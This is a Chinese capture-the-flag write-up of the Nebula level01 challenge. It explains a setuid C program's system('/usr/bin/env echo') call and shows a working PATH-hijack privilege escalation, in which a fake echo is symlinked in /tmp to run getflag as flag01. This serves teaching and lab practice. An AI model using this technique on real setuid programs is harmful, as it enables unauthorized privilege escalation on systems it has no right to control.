flag01的源码官方已经提供，这道题目是让我们分析该代码，找出代码中存在的一处可执行任意文件漏洞。题目提供的代码如下：

#+BEGIN_SRC c
  #include <stdlib.h>
  #include <unistd.h>
  #include <string.h>
  #include <sys/types.h>
  #include <stdio.h>

  int main(int argc, char **argv, char **envp)
  {
    gid_t gid;
    uid_t uid;
    gid = getegid();
    uid = geteuid();

    setresgid(gid, gid, gid);
    setresuid(uid, uid, uid);

    system("/usr/bin/env echo and now what?");
  }
#+END_SRC

分析可执行任意文件漏洞的重点是先找到程序中执行命令的地方。通过分析上面的源码中可以看到程序调用了system函数，system函数可以执行指定的Shell命令，在这里system执行的/usr/bin/env命令，注意system的参数是一个字符串而非变量，所以我们不能直接控制system函数的行为。那重点就放在了env命令上，通过man env得到的帮助如下：

#+BEGIN_EXAMPLE
  env - run a program in a modified environment
#+END_EXAMPLE

简单来讲，env的参数是要执行的Shell命令，env会遍历PATH环境变量中的路径来寻找要执行的命令。env命令常出现在脚本文件的第一行，比如

#+BEGIN_EXAMPLE
  #!/usr/bin/env python
#+END_EXAMPLE

这样写的好处是为了防止把位置写死，如果写成“#!/usr/bin/python”的话，在其他一些系统中，~python~ 命令未必在 ~/usr/bin~ 目录中。用了env，不管python在哪个目录中，只要目录列在PATH环境变量中，就可以被找到。

所以，真正的问题是出在PATH变量上，虽然调用的参数无法被控制，但它执行命令受限于外部PATH变量，而PATH变量是可控的。env是依次遍历PATH变量中的目录，只要我们让env优先找到伪装的echo命令，就起到了劫持作用。

并且flag01被设置了SUID，所以会以flag01帐号身份运行程序：

#+BEGIN_EXAMPLE
  -rwsr-x---  1 flag01 level01 7322 Nov 20  2011 flag01*
#+END_EXAMPLE

我们可让/tmp/echo链接到/bin/getflag上，然后修改PATH环境变量，把/tmp放在最前面，这样env会首先在/tmp下找到echo并执行（并且是以flag01身份运行）。

#+BEGIN_EXAMPLE
  level01@nebula:~$ cd /tmp/
  level01@nebula:/tmp$ ln -s /bin/getflag /tmp/echo
  level01@nebula:/tmp$ PATH=/tmp:$PATH  # 让/tmp出现在PATH最前面
  level01@nebula:/tmp$ cd /home/flag01
  level01@nebula:/home/flag01$ ./flag01 # 提权成功
  You have successfully executed getflag on a target account
#+END_EXAMPLE
